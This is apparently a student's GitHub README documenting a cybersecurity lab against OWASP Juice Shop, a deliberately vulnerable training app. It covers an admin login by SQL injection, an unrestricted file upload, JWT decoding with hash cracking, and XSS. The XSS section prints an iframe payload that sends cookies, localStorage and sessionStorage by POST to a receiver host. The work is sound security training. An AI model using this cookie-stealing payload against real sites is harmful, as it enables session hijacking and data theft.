# project2
## Description:
This project focuses on practical cybersecurity training by exploring web application vulnerabilities, writing professional reports, solving Capture The Flag (CTF) challenges, and mastering network scanning. It includes hands-on tasks with OWASP Juice Shop and TryHackMe's "Root Me" CTF, enhancing both offensive and defensive skills. Additionally, it incorporates developing a custom Python-based Nmap tool, fostering scripting and network analysis expertise.

**Assessment Methods:**

**Practical Exploration:**

**Identifying and documenting at least 5 vulnerabilities in OWASP Juice Shop.**

**Rooting a machine in the "Root Me" CTF.**

**Tool Proficiency:**

**Running Nmap scans on the Metasploitable or CTF server to detect services and vulnerabilities.**

**Developing a custom Python-based Nmap scanner that performs similar functions.**

**Report Writing:**

**Submitting a well-structured vulnerability assessment report on Juice Shop findings.**

**Including analysis, impact, and mitigation for identified vulnerabilities.**

**Learning Methods:**

**Hands-on experimentation with OWASP Juice Shop and TryHackMe challenges.**

**Guided and independent use of Nmap.**

**Python scripting for network analysis.**

**Research on professional report-writing techniques.**

## Requirements:

**Juice Shop** 

**Metasploitable**

**Burp Suite**

**TryHackMe account**

**Nmap**

**Gobuster**

**Metasploit**

**Python**
### Vulnerabilities in OWASP Juice Shop

**Steps to Install docker and Exploring OWASP Juice Shop Vulnerabilities**

**Install Docker**

```
sudo apt install docker.io
```

```
sudo su
```

``
usermod -aG docker {{user-anun}}
``

```
su {{user-anun}}
```

Run 
```
docker pull bkimminich/juice-shop
```

Run 
```
docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop
```

**Exposes port 3000 on your localhost, allowing you to access
Juice Shop via http://localhost:3000**

#### 1. SQL Injection
**About attack:** SQL Injection exploits improper handling of user inputs in SQL queries. If input fields or URL parameters are not properly sanitized or validated, attackers can inject malicious SQL code to manipulate the query.

**How it was detected:** 
Lets try to dump system with SQL prompts.
We have access to admin page, with some games of clicking buttons, we can find the mail of admin. Here it is.
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_03_08_45.png)
Login with the administration's user account.
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_03_11_10.png)
Access the administration section of the stor
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_03_14_12.png)

#### 2. Security Misconfiguration
Uploading leaks
in this page valide only images file  
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_04_51_36.png)
but we can upload other file too
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_04_52_28.png)
 for exampl .zip,pdf
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-02_11_29_25.png)
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-02_11_28_40.png)

#### 3. Broken Access Control
**Use boolean OR and write true expression. before login turn on burpsuite, catch traffic from proxy, throw repeater and click send.** 

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_14_50_16.png)


**Now get token from response part and use convertor for example https://jwt.io/**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-05%2000-17-25.png)

**Now get hashing password,  use something algorithm for get true password, https://crackstation.net/  may be it weak...**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-04%2023-53-05.png)

**Congratulations!!!**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_15_02_45.png)
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_15_05_02.png)

#### 4. Cross-Site Scripting (XSS)

About attack: Cross-Site Scripting (XSS) is a type of security vulnerability in web applications where an attacker injects malicious scripts into trusted websites. These scripts run in the context of other users' browsers, potentially allowing the attacker to steal sensitive information like session cookies, manipulate website content, or perform unauthorized actions on behalf of the victim.

**There are many payloads for XSS attacks. Some of them can be found in the https://xss.js.org/**
The payload is 
```
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```
**Injecting JavaScript into input fields like search or feedback forms.**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-05%2002-52-29.png)

payload can be 
```
<iframe src="javascript:fetch('http://localhost:5000/receiver', {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({cookies: document.cookie,localStorage: JSON.stringify(localStorage),sessionStorage: JSON.stringify(sessionStorage)})});"> </iframe>
```
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-05%2002-54-11.png))
